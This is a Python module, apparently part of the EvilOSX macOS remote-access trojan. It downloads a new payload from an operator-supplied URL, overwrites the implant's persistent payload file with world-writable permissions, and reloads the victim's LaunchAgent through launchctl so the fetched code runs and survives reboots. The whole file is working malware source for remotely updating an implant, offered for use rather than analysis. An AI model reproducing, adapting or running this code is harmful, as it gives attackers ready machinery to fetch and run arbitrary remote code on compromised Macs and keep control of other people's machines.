# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import os
import shutil
import subprocess
from os import path

# Python 2 / Python 3 compatible HTTP fetching.
try:
    from urllib.request import urlopen, Request, HTTPError
except ImportError:
    from urllib2 import urlopen, Request, HTTPError


BACKUP_FILENAME_SUFFIX = ".bak"


def run_command(command):
    """Runs a system command and returns its output."""
    try:
        out, err = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True
        ).communicate()
        if isinstance(out, bytes):
            out = out.decode("utf-8", errors="replace")
        return (out or "").strip()
    except Exception as ex:
        return str(ex)


def looks_like_payload(data):
    """A cheap sanity check that the downloaded file is actually a payload.

    :type data: bytes
    :rtype: bool
    """
    probe = data[:512].decode("utf-8", errors="ignore").lstrip()
    if not probe:
        return False
    return probe.startswith("#!") or "def get_uid" in probe or "SERVER_HOST" in probe


def run(options):
    """Swaps the persistent payload with a freshly downloaded one.

    :type options: dict
    """
    response_options = options.get("response_options", {}) or {}
    update_url = response_options.get("update_url", "")
    program_directory = options.get("program_directory", "")
    loader_options = options.get("loader_options", {}) or {}

    if not update_url:
        print("Error: no update_url provided, cannot update.")
        return

    payload_filename = loader_options.get("payload_filename") or \
        response_options.get("payload_filename", "main.py")
    launch_agent_name = loader_options.get("launch_agent_name", "")

    payload_file = path.join(program_directory, payload_filename)
    backup_file = payload_file + BACKUP_FILENAME_SUFFIX

    if not os.path.isfile(payload_file):
        print("Error: current payload not found at " + payload_file)
        return

    # 1. Download the new payload.
    print("Downloading update from " + update_url)
    try:
        request = Request(update_url)
        response_handle = urlopen(request, timeout=30)
        new_payload = response_handle.read()
        response_handle.close()
    except HTTPError as ex:
        print("Error: failed to download update (HTTP " + str(ex.code) + ").")
        return
    except Exception as ex:
        print("Error: failed to download update: " + str(ex))
        return

    # 2. Validate the payload.
    if not new_payload or not looks_like_payload(new_payload):
        print("Error: downloaded payload is empty or invalid, aborting.")
        return

    # 3. Swap the payload and its backup (atomic-ish via temp file).
    temp_file = payload_file + ".new"
    try:
        with open(temp_file, "wb") as output_file:
            output_file.write(new_payload)
        os.chmod(temp_file, 0o777)
        os.rename(temp_file, payload_file)
        shutil.copyfile(payload_file, backup_file)
    except Exception as ex:
        print("Error: failed to write updated payload: " + str(ex))
        try:
            if os.path.exists(temp_file):
                os.remove(temp_file)
        except OSError:
            pass
        return

    # 4. Reload the launch agent so the new payload is picked up.
    launch_agent_file = path.join(
        path.expanduser("~/Library/LaunchAgents"), launch_agent_name + ".plist"
    )

    if launch_agent_name and os.path.isfile(launch_agent_file):
        run_command("launchctl unload -w " + launch_agent_file)
        run_command("launchctl bootout gui/$(id -u)/" + launch_agent_name)
        run_command("launchctl load -w " + launch_agent_file)
        if run_command("launchctl list | grep -w " + launch_agent_name):
            print("Updated successfully, launch daemon reloaded.")
        else:
            print("Payload replaced but launch agent not listed yet.")
    else:
        print("Updated successfully, payload replaced.")
